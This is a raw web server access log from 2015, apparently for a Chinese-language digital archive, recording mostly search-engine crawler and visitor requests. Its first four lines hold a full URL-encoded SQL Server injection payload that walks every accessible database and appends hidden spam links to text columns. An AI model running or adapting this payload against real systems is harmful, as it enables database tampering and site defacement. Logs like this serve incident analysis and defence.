96.47.2.10 - - [18/Sep/2015:13:57:26 +0800] "GET /content/subject/resource_content.jsp?oid=16777344';declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''reasons%20people%20cheat%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''www.gerarprieto.com''%2Bchar(47)%2B''page''%2Bchar(47)%2B''how-to-cheat-on-wife%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''gerarprieto.com''''%20when%201%20then%20''''gerarprieto.com''''%20else%20''''gerarprieto.com''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20when%20a%20husband%20cheats''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
96.47.2.10 - - [18/Sep/2015:13:57:27 +0800] "GET /content/subject/resource_content.jsp?oid=16777344;declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''reasons%20people%20cheat%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''www.gerarprieto.com''%2Bchar(47)%2B''page''%2Bchar(47)%2B''how-to-cheat-on-wife%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''gerarprieto.com''''%20when%201%20then%20''''gerarprieto.com''''%20else%20''''gerarprieto.com''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20when%20a%20husband%20cheats''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
96.47.2.10 - - [18/Sep/2015:13:57:28 +0800] "GET /content/subject/resource_content.jsp?oid=16777344);declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''reasons%20people%20cheat%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''www.gerarprieto.com''%2Bchar(47)%2B''page''%2Bchar(47)%2B''how-to-cheat-on-wife%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''gerarprieto.com''''%20when%201%20then%20''''gerarprieto.com''''%20else%20''''gerarprieto.com''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20when%20a%20husband%20cheats''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
96.47.2.10 - - [18/Sep/2015:13:57:28 +0800] "GET /content/subject/resource_content.jsp?oid=16777344');declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''reasons%20people%20cheat%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''www.gerarprieto.com''%2Bchar(47)%2B''page''%2Bchar(47)%2B''how-to-cheat-on-wife%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''gerarprieto.com''''%20when%201%20then%20''''gerarprieto.com''''%20else%20''''gerarprieto.com''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20when%20a%20husband%20cheats''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
223.200.90.61 - - [18/Sep/2015:13:57:31 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%A8%9F%E5%B1%AC+%E6%A8%9F%E7%A7%91+%E8%8F%B2%E5%BE%8B%E8%B3%93%E6%A8%9F%E6%A8%B9+&oid=2149359 HTTP/1.1" 200 3364
66.249.71.205 - - [18/Sep/2015:13:57:40 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B9%B3%E5%AE%89%E7%AC%A6%20%E9%8E%AE%E5%AE%85%E5%B9%B3%E5%AE%89%20&oid=4362902 HTTP/1.1" 200 3115
66.249.71.249 - - [18/Sep/2015:13:57:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BB%A4%E7%AF%80+%E7%9A%87%E5%A4%AA%E5%90%8E+&oid=2557086 HTTP/1.1" 200 4892
223.200.90.61 - - [18/Sep/2015:13:57:48 +0800] "GET /content/repository/resource_content.jsp?oid=2149940 HTTP/1.1" 200 30817
66.249.71.229 - - [18/Sep/2015:13:57:48 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BB%A4%E7%AF%80%20%E7%9A%87%E5%A4%AA%E5%90%8E%20&oid=2557086 HTTP/1.1" 200 4892
223.200.90.61 - - [18/Sep/2015:13:57:51 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%A8%9F%E5%B1%AC+%E6%A8%9F%E7%A7%91+%E8%8F%B2%E5%BE%8B%E8%B3%93%E6%A8%9F%E6%A8%B9+&oid=2149940 HTTP/1.1" 200 3364
125.230.119.95 - - [18/Sep/2015:13:57:55 +0800] "GET /content/repository/resource_content.jsp?oid=1608481 HTTP/1.1" 200 28668
125.230.119.95 - - [18/Sep/2015:13:57:56 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%81%BD%E9%80%A0%E6%96%87%E6%9B%B8+%E6%9B%B8%E5%9C%96+%E7%B8%A3%E6%94%BF%E5%BA%9C+%E8%8B%97%E6%A0%97%E7%B8%A3%E6%94%BF%E5%BA%9C+&oid=1608481 HTTP/1.1" 200 7237
66.249.71.229 - - [18/Sep/2015:13:57:59 +0800] "GET /content/repository/resource_content.jsp?oid=176691 HTTP/1.1" 200 30139
66.249.71.239 - - [18/Sep/2015:13:58:23 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%9C%B0%E5%BD%A2%E5%9C%96+%E6%B0%B8%E5%92%8C%E9%97%9C+&oid=176691 HTTP/1.1" 200 3096
66.249.71.239 - - [18/Sep/2015:13:58:28 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%9C%B0%E5%BD%A2%E5%9C%96%20%E6%B0%B8%E5%92%8C%E9%97%9C%20&oid=176691 HTTP/1.1" 200 3096
59.125.53.235 - - [18/Sep/2015:13:58:32 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%83%8F%E5%BF%83%E7%9F%B3+%E9%B1%B8%E9%B0%BB+&oid=16777303 HTTP/1.1" 200 4004
207.46.13.45 - - [18/Sep/2015:13:58:37 +0800] "GET /content/subject/resource_content.jsp?oid=16777448&queryType=qc HTTP/1.1" 200 34545
123.125.71.77 - - [18/Sep/2015:13:59:28 +0800] "GET /digiarch_en/content/subject/resource_content.jsp?oid=16777741&queryType=qc HTTP/1.1" 200 54372
66.249.71.196 - - [18/Sep/2015:13:59:39 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=18886&queryString=%E8%9D%B4%E8%9D%B6%E9%AD%9A%E7%A7%91%20%E9%8A%80%E6%96%91%E8%9D%B6%E9%AD%9A HTTP/1.1" 200 29879
208.115.113.86 - - [18/Sep/2015:14:00:24 +0800] "GET /content/subject/resource_content.jsp?oid=16777518&queryType=qc HTTP/1.1" 200 27912
66.249.71.249 - - [18/Sep/2015:14:00:29 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777849&queryType=qc HTTP/1.1" 200 31866
66.249.71.239 - - [18/Sep/2015:14:00:30 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777849 HTTP/1.1" 200 1405
66.249.71.225 - - [18/Sep/2015:14:00:38 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B1%85%E5%BB%B6%E6%BC%A2%E7%B0%A1%20%E6%BC%A2%E7%B0%A1%20&oid=286094 HTTP/1.1" 200 3898
66.249.71.229 - - [18/Sep/2015:14:01:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%8D%89%E9%AD%9A+%E9%AF%89%E7%A7%91+&oid=21481 HTTP/1.1" 200 3355
66.249.71.229 - - [18/Sep/2015:14:01:02 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%8D%89%E9%AD%9A%20%E9%AF%89%E7%A7%91%20&oid=21481 HTTP/1.1" 200 3355
66.249.71.54 - - [18/Sep/2015:14:01:20 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777831&queryString= HTTP/1.1" 200 34308
66.249.71.205 - - [18/Sep/2015:14:02:48 +0800] "GET /content/repository/resource_content.jsp?oid=1811556&queryString=%E5%A4%AA%E5%AE%88%20%E5%B4%96%E5%A2%93%20%E6%96%B0%E6%B4%A5%20%E6%96%B0%E6%B4%A5%E7%9F%B3%E5%87%BD%E7%95%AB%E8%B1%A1%20%E7%95%AB%E5%83%8F%E7%9F%B3%20%E7%A5%9E%E8%BE%B2 HTTP/1.1" 200 34265
66.249.71.217 - - [18/Sep/2015:14:02:58 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E8%9D%B4%E8%9D%B6%E9%AD%9A%E7%A7%91+%E9%8A%80%E6%96%91%E8%9D%B6%E9%AD%9A+&oid=18886 HTTP/1.1" 200 3229
66.249.71.239 - - [18/Sep/2015:14:03:02 +0800] "GET /content/repository/resource_content.jsp?oid=1457728&queryString=%E6%8D%B2%E7%93%A3%E8%98%AD%E5%B1%AC%20%E8%B1%86%E8%98%AD%E5%B1%AC HTTP/1.1" 200 31403
66.249.71.217 - - [18/Sep/2015:14:03:03 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E8%9D%B4%E8%9D%B6%E9%AD%9A%E7%A7%91%20%E9%8A%80%E6%96%91%E8%9D%B6%E9%AD%9A%20&oid=18886 HTTP/1.1" 200 3229
208.115.113.86 - - [18/Sep/2015:14:03:18 +0800] "GET /digiarch_en/content/subject/resource_content.jsp?oid=16777764&queryType=qc HTTP/1.1" 200 36856
208.115.113.86 - - [18/Sep/2015:14:04:36 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777750&queryType=qc HTTP/1.1" 200 32518
66.249.71.239 - - [18/Sep/2015:14:04:41 +0800] "GET /content/repository/resource_content.jsp?oid=16258&queryString=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E5%B0%BE%E6%96%91%E9%B0%AD%E5%A1%98%E9%B1%A7%20%E9%9D%92%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E9%B1%A7%E7%A7%91 HTTP/1.1" 200 31037
66.249.71.205 - - [18/Sep/2015:14:04:42 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%9D%9F%E8%8D%89%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E8%8E%8E%E8%8D%89%20%E8%8E%8E%E8%8D%89%E7%A7%91%20%E8%96%B9%E5%B1%AC%20&oid=3812340 HTTP/1.1" 200 3294
66.249.71.239 - - [18/Sep/2015:14:05:01 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7+%E5%A1%98%E9%B1%A7+%E7%B4%B0%E9%B1%97%E9%B0%AD%E5%A1%98%E9%B1%A7+%E9%B1%A7%E7%A7%91+&oid=16258 HTTP/1.1" 200 3399
66.249.71.249 - - [18/Sep/2015:14:05:04 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E5%A1%98%E9%B1%A7%20%E7%B4%B0%E9%B1%97%E9%B0%AD%E5%A1%98%E9%B1%A7%20%E9%B1%A7%E7%A7%91%20&oid=16258 HTTP/1.1" 200 3399
66.249.71.54 - - [18/Sep/2015:14:06:15 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777831 HTTP/1.1" 200 1405
66.249.79.200 - - [18/Sep/2015:14:06:23 +0800] "GET /content/repository/resource_content.jsp?oid=1113729 HTTP/1.1" 200 30044
123.125.71.72 - - [18/Sep/2015:14:06:54 +0800] "GET /content/subject/resource_content.jsp?oid=16777329 HTTP/1.1" 200 27826
220.181.108.180 - - [18/Sep/2015:14:06:58 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B1%B1%E6%AB%BB%E8%8A%B1+&oid=16777329 HTTP/1.1" 200 4446
66.249.71.215 - - [18/Sep/2015:14:07:29 +0800] "GET /content/repository/resource_content.jsp?oid=2150532&queryString=%E6%A4%8D%E7%89%A9%E7%95%8C%20%E6%A5%93%E9%A6%99%20%E6%A5%93%E9%A6%99%E5%B1%AC%20%E9%87%91%E7%B8%B7%E6%A2%85%20%E9%87%91%E7%B8%B7%E6%A2%85%E7%A7%91 HTTP/1.1" 200 31456
123.194.196.4 - - [18/Sep/2015:14:08:37 +0800] "HEAD /content/tmp_exh/resource_content.jsp?oid=16777849&queryType=qc HTTP/1.1" 200 -
123.194.196.4 - - [18/Sep/2015:14:08:38 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777849&queryType=qc HTTP/1.1" 200 31866
218.168.0.75 - - [18/Sep/2015:14:08:41 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777849&queryType=qc HTTP/1.1" 200 31866
218.168.0.75 - - [18/Sep/2015:14:08:42 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777849 HTTP/1.1" 200 1405
114.34.181.207 - - [18/Sep/2015:14:09:12 +0800] "GET /content/repository/resource_content.jsp?oid=16134&queryString=%E5%BD%88%E5%A1%97%E9%AD%9A%20%E8%99%8E%E7%A7%91 HTTP/1.1" 200 33288
114.34.181.207 - - [18/Sep/2015:14:09:13 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%A4%A7%E5%BD%88%E5%A1%97%E9%AD%9A+%E5%BD%88%E5%A1%97%E9%AD%9A+%E8%99%8E%E7%A7%91+%E8%9D%A6%E8%99%8E+%E8%9D%A6%E8%99%8E%E7%A7%91+&oid=16134 HTTP/1.1" 200 3390
66.249.71.249 - - [18/Sep/2015:14:09:42 +0800] "GET /content/repository/resource_content.jsp?oid=1896800 HTTP/1.1" 200 30616
66.249.71.249 - - [18/Sep/2015:14:10:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777849 HTTP/1.1" 200 1405
66.249.71.229 - - [18/Sep/2015:14:11:23 +0800] "GET /content/repository/resource_content.jsp?oid=1876952 HTTP/1.1" 200 29797
66.249.71.249 - - [18/Sep/2015:14:11:28 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E6%9D%B1%E9%B1%97%E6%AF%9B%E8%95%A8+%E6%AF%9B%E8%95%A8+%E6%AF%9B%E8%95%A8%E5%B1%AC+%E8%95%A8%E5%B1%AC+%E9%B1%97%E6%AF%9B+%E9%B1%97%E6%AF%9B%E8%95%A8+%E9%B1%97%E6%AF%9B%E8%95%A8%E5%B1%AC+&oid=1113729 HTTP/1.1" 200 3499
66.249.71.229 - - [18/Sep/2015:14:11:31 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E6%9D%B1%E9%B1%97%E6%AF%9B%E8%95%A8%20%E6%AF%9B%E8%95%A8%20%E6%AF%9B%E8%95%A8%E5%B1%AC%20%E8%95%A8%E5%B1%AC%20%E9%B1%97%E6%AF%9B%20%E9%B1%97%E6%AF%9B%E8%95%A8%20%E9%B1%97%E6%AF%9B%E8%95%A8%E5%B1%AC%20&oid=1113729 HTTP/1.1" 200 3499
66.249.71.205 - - [18/Sep/2015:14:11:57 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%AD%94%E9%96%80%20%E6%AD%A6%E6%96%91%E7%A5%A0%20%E6%AD%A6%E6%B0%8F%E7%A5%A0%20%E6%AD%A6%E6%B0%8F%E7%A5%A0%E5%B7%A6%E7%9F%B3%E5%AE%A4%20%E7%95%AB%E5%83%8F%E7%9F%B3%20%E9%9D%88%E7%95%B0%20&oid=1811556 HTTP/1.1" 200 5293
66.249.71.225 - - [18/Sep/2015:14:12:01 +0800] "GET /content/repository/resource_content.jsp?oid=1887807&queryString=%E5%A4%8F%E6%9C%9F%20%E6%9D%9C%E7%A3%81%20%E6%9D%9C%E9%A6%99%E5%9C%8B%20%E6%9F%AF%E6%B8%85%E6%A8%99%20%E7%AE%97%E8%A1%93%20%E8%87%BA%E7%81%A3%E7%B8%BD%E7%9D%A3%E5%BA%9C%20%E8%8E%8A%E6%B0%B4%20%E9%99%B3%E5%98%89%E9%82%A6 HTTP/1.1" 200 30736
66.249.71.205 - - [18/Sep/2015:14:12:04 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C%20%E6%A5%93%E9%A6%99%20%E6%A5%93%E9%A6%99%E5%B1%AC%20%E9%87%91%E7%B8%B7%E6%A2%85%20%E9%87%91%E7%B8%B7%E6%A2%85%E7%A7%91%20&oid=2150532 HTTP/1.1" 200 4386
66.249.71.239 - - [18/Sep/2015:14:12:13 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%8D%B2%E7%93%A3%E8%98%AD+%E6%8D%B2%E7%93%A3%E8%98%AD%E5%B1%AC+%E8%98%AD%E5%B1%AC+%E8%B1%86%E8%98%AD+%E8%B1%86%E8%98%AD%E5%B1%AC+%E9%BB%83%E8%90%BC%E6%8D%B2%E7%93%A3%E8%98%AD+&oid=1457728 HTTP/1.1" 200 3351
66.249.71.239 - - [18/Sep/2015:14:12:18 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%8D%B2%E7%93%A3%E8%98%AD%20%E6%8D%B2%E7%93%A3%E8%98%AD%E5%B1%AC%20%E8%98%AD%E5%B1%AC%20%E8%B1%86%E8%98%AD%20%E8%B1%86%E8%98%AD%E5%B1%AC%20%E9%BB%83%E8%90%BC%E6%8D%B2%E7%93%A3%E8%98%AD%20&oid=1457728 HTTP/1.1" 200 3351
220.130.246.112 - - [18/Sep/2015:14:12:25 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777849&queryString= HTTP/1.1" 200 31866
220.130.246.112 - - [18/Sep/2015:14:12:25 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777849 HTTP/1.1" 200 1405
175.182.77.64 - - [18/Sep/2015:14:12:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777542 HTTP/1.1" 200 1405
66.249.71.239 - - [18/Sep/2015:14:13:03 +0800] "GET /content/repository/resource_content.jsp?oid=1123731 HTTP/1.1" 200 29894
66.249.71.239 - - [18/Sep/2015:14:13:24 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B5%B7%E7%89%9B+%E6%B5%B7%E9%BA%92%E9%BA%9F+%E8%85%B9%E8%B6%B3%E7%B6%B1+&oid=1123731 HTTP/1.1" 200 3444
66.249.79.207 - - [18/Sep/2015:14:13:28 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B5%B7%E7%89%9B%20%E6%B5%B7%E9%BA%92%E9%BA%9F%20%E8%85%B9%E8%B6%B3%E7%B6%B1%20&oid=1123731 HTTP/1.1" 200 3444
68.180.230.178 - - [18/Sep/2015:14:13:49 +0800] "GET /content/subject/resource_content.jsp?oid=16797281&queryType=qc HTTP/1.1" 200 53084
59.173.183.65 - - [18/Sep/2015:14:13:56 +0800] "GET /digiarch_en/content/subject/resource_content.jsp?oid=16777743&queryString= HTTP/1.1" 200 27660
66.249.71.229 - - [18/Sep/2015:14:14:44 +0800] "GET /content/repository/resource_content.jsp?oid=2586265 HTTP/1.1" 200 29304
66.249.71.249 - - [18/Sep/2015:14:16:24 +0800] "GET /content/repository/resource_content.jsp?oid=1609612 HTTP/1.1" 200 28545
66.249.71.225 - - [18/Sep/2015:14:16:42 +0800] "GET /content/repository/resource_content.jsp?oid=1555981&queryType=qs&queryString=%E6%92%AB%E5%8D%B9%E9%87%91 HTTP/1.1" 200 30973
66.249.71.226 - - [18/Sep/2015:14:18:04 +0800] "GET /content/repository/resource_content.jsp?oid=4467895&queryType=qs&queryString=%E6%BF%B1%E7%94%B0 HTTP/1.1" 200 28352
66.249.71.239 - - [18/Sep/2015:14:18:22 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%B1%E6%9C%89%E5%9C%9F%E5%9C%B0+%E5%9C%9F%E5%9C%B0%E6%94%BE%E9%A0%98+%E6%9D%8E%E5%AD%98%E6%95%AC+%E6%9E%97%E6%98%8E%E5%BE%B7+%E6%9E%97%E8%94%A1%E7%B4%A0%E5%A5%B3+%E6%B9%AF%E6%85%B6%E6%9D%BE+%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C+%E7%9C%81%E6%94%BF%E5%BA%9C+%E7%9C%81%E6%9C%89%E5%9C%9F%E5%9C%B0+%E8%87%BA%E7%81%A3%E7%9C%81+%E8%87%BA%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C+%E8%91%A3%E9%8C%A6%E6%A8%B9+%E8%94%A1%E7%B4%A0%E5%A5%B3+%E9%A0%90%E7%AE%97+%E9%AB%98%E8%82%B2%E4%BB%81+%E9%BB%83%E5%85%89%E5%B9%B3+&oid=1896800 HTTP/1.1" 200 5297
66.249.71.229 - - [18/Sep/2015:14:18:31 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%B1%E6%9C%89%E5%9C%9F%E5%9C%B0%20%E5%9C%9F%E5%9C%B0%E6%94%BE%E9%A0%98%20%E6%9D%8E%E5%AD%98%E6%95%AC%20%E6%9E%97%E6%98%8E%E5%BE%B7%20%E6%9E%97%E8%94%A1%E7%B4%A0%E5%A5%B3%20%E6%B9%AF%E6%85%B6%E6%9D%BE%20%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C%20%E7%9C%81%E6%94%BF%E5%BA%9C%20%E7%9C%81%E6%9C%89%E5%9C%9F%E5%9C%B0%20%E8%87%BA%E7%81%A3%E7%9C%81%20%E8%87%BA%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C%20%E8%91%A3%E9%8C%A6%E6%A8%B9%20%E8%94%A1%E7%B4%A0%E5%A5%B3%20%E9%A0%90%E7%AE%97%20%E9%AB%98%E8%82%B2%E4%BB%81%20%E9%BB%83%E5%85%89%E5%B9%B3%20&oid=1896800 HTTP/1.1" 200 5297
66.249.71.216 - - [18/Sep/2015:14:18:38 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%BF%B1%E7%94%B0+&oid=4467895 HTTP/1.1" 200 3153
66.249.71.216 - - [18/Sep/2015:14:18:43 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%BF%B1%E7%94%B0%20&oid=4467895 HTTP/1.1" 200 3153
66.249.71.229 - - [18/Sep/2015:14:19:45 +0800] "GET /content/repository/resource_content.jsp?oid=1882573 HTTP/1.1" 200 29642
182.118.74.84 - - [18/Sep/2015:14:20:45 +0800] "GET /content/subject/resource_content.jsp?oid=16777419&querytype=qc HTTP/1.1" 200 28221
61.135.189.170 - - [18/Sep/2015:14:20:58 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1591950 HTTP/1.1" 404 14873
66.249.79.193 - - [18/Sep/2015:14:21:14 +0800] "GET /content/subject/resource_content.jsp?oid=16777781&queryType=qs&queryString=%E5%9F%BA%E7%9D%A3%E5%BE%92 HTTP/1.1" 200 57405
61.135.189.170 - - [18/Sep/2015:14:21:14 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3396544 HTTP/1.1" 404 14873
66.249.71.249 - - [18/Sep/2015:14:21:25 +0800] "GET /content/repository/resource_content.jsp?oid=1895037&queryString=%E4%BD%8F%E9%83%BD%E5%B1%80%20%E6%B1%A1%E6%B0%B4%E8%99%95%E7%90%86%E5%BB%A0%20%E7%B6%81%E6%A8%99 HTTP/1.1" 200 30151
182.118.74.84 - - [18/Sep/2015:14:21:30 +0800] "GET /content/subject/resource_content.jsp?oid=16777440&queryType=qc HTTP/1.1" 200 50102
